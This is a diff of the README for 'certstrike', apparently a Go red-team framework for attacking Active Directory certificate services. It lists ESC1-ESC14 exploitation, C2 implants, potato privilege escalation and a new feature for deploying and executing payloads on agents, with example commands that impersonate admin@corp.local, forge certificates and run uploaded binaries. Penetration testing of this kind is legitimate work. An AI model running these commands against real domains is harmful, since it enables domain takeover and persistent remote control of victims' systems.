@@ -6,7 +6,7 @@ ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go
 ## Architecture
 - `cmd/certstrike/` — CLI entry points (cobra commands)
 - `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, shadow credentials, certificate forging, reporting
-- `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent
+- `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent, file delivery/deploy
 - `internal/mcp/` — MCP stdio server (5 tools)
 - `internal/tui/` — Bubbletea operator console
 - `implants/smartpotato/` — Windows potato privilege escalation (JuicyPotato, RoguePotato, SweetPotato)
@@ -20,11 +20,19 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 ## Features
 
 ### PKI / ADCS
-- ESC1-ESC5 detection + exploitation (ESC4 full ACE parsing)
+- ESC1-ESC14 complete detection + exploitation with dedicated Scan/Exploit functions
+- ESC1 misconfigured templates (enrollee supplies subject + auth EKU)
+- ESC2 Any Purpose EKU templates
+- ESC3 Enrollment Agent templates (two-stage attack)
+- ESC4 vulnerable template ACLs (full ACE parsing, WriteDACL/WriteOwner)
+- ESC5 vulnerable PKI object ACLs on CA
+- ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 (arbitrary SAN injection)
+- ESC7 vulnerable CA ACLs (ManageCA → enable ESC6 → exploit → restore)
 - ESC8 HTTP web enrollment relay detection
 - ESC9 CT_FLAG_NO_SECURITY_EXTENSION detection + UPN swap exploitation
 - ESC10 weak certificate mapping detection
 - ESC11 RPC interface encryption enforcement detection
+- ESC12 DCOM interface abuse detection
 - ESC13 OID group link abuse detection + exploitation
 - ESC14 weak explicit mappings detection
 - Shadow Credentials (msDS-KeyCredentialLink add/list/remove)
@@ -39,6 +47,8 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 - Session management (register, poll, command queue, result collection)
 - Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS)
 - Polling agent: `certstrike agent --config stager.json`
+- File delivery: upload and deploy arbitrary binaries to agents
+- Deploy command: `certstrike deploy --session <ID> --file ./payload --path /tmp/svc --execute`
 
 ### QoL
 - LDAPS/StartTLS support
@@ -53,6 +63,10 @@ cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
 ```bash
 certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --exploit esc2 --template AnyPurpose --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --exploit esc3 --template EnrollAgent --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --exploit esc6 --template AnyTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
+certstrike pki --exploit esc7 --ca CorpCA --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --exploit esc9 --template NoSecExt --upn admin@corp.local --attacker-dn "CN=..." --target-dc dc01 --domain corp.local -u user -p pass
 certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
 certstrike pki --cert-theft all
@@ -62,6 +76,7 @@ certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u u
 certstrike auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
 certstrike c2 --port 8443 --protocol https
 certstrike agent --config stager.json
+certstrike deploy --c2-url http://localhost:8443 --session <ID> --file ./stager --path /tmp/svc --execute
 ```
 
 ## Dependencies
